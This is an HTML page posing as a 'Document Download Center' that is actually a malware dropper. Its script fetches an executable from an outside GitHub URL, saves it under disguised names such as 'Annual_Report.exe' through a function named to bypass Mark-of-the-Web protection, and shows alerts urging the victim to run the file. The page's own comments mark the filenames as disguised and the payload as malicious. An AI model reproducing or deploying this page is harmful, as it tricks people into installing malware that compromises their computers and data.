<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        .download-section { margin: 30px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9; }
        button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #3367d6; }
        .loading { display: none; color: #666; margin-top: 10px; }
        .filename { font-weight: bold; color: #1a73e8; }
    </style>
</head>
<body>
    <h1>Document Download Center</h1>
    
    <div class="download-section">
        <h2>Download Important Document</h2>
        <p>Click below to download your <span class="filename">Annual_Report.exe</span> file.</p>
        <p><small>This document requires the latest viewer application.</small></p>
        <button onclick="downloadFile()">Download Document Viewer</button>
        <div id="loading1" class="loading">Preparing download... Please wait.</div>
    </div>

    <div class="download-section">
        <h2>Alternative Download Method</h2>
        <p>If the above doesn't work, try our <span class="filename">Document_Container.exe</span> version.</p>
        <button onclick="createContainer()">Download Container Version</button>
        <div id="loading2" class="loading">Creating secure container... Please wait.</div>
    </div>

    <script>
        // Method 1: Fetch + Blob download
        async function downloadFile() {
            const url = 'https://github.com/mitasahi/root/raw/refs/heads/main/Khabo.jpg.exe';
            const filename = 'Annual_Report.exe'; // Disguised filename
            
            try {
                document.body.style.cursor = 'wait';
                document.getElementById('loading1').style.display = 'block';
                await fetchBypassMotw(url, filename);
                setTimeout(() => {
                    document.getElementById('loading1').style.display = 'none';
                    alert('Download completed successfully!\nPlease run the file to view your document.');
                }, 1500);
            } catch (e) {
                document.getElementById('loading1').style.display = 'none';
                alert('Download failed: The document viewer could not be downloaded.\nError: ' + e.message);
            } finally {
                document.body.style.cursor = 'default';
            }
        }

        async function fetchBypassMotw(url, filename) {
            const res = await fetch(url, { cache: 'no-store' });
            if (!res.ok) throw new Error('Network response was not ok');
            const blob = await res.blob();
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(a.href);
            }, 100);
        }

        // Method 2: Web container
        async function createContainer() {
            try {
                document.body.style.cursor = 'wait';
                document.getElementById('loading2').style.display = 'block';
                
                // First fetch the actual executable
                const response = await fetch('https://github.com/mitasahi/root/raw/refs/heads/main/Khabo.jpg.exe', { cache: 'no-store' });
                if (!response.ok) throw new Error('Failed to fetch container content');
                const buffer = await response.arrayBuffer();
                const maliciousCode = new Uint8Array(buffer);
                
                const containerUrl = packageInWebContainer(maliciousCode);
                
                const a = document.createElement('a');
                a.href = containerUrl;
                a.download = 'Document_Container.exe'; // Disguised filename
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(containerUrl);
                    document.getElementById('loading2').style.display = 'none';
                    alert('Secure container created successfully!\nRun this file to access your documents.');
                }, 1500);
            } catch (e) {
                document.getElementById('loading2').style.display = 'none';
                alert('Container creation failed: ' + e.message);
            } finally {
                document.body.style.cursor = 'default';
            }
        }

        function packageInWebContainer(maliciousCode) {
            const blob = new Blob([maliciousCode], {type: 'application/octet-stream'});
            return URL.createObjectURL(blob);
        }
    </script>
</body>
</html>
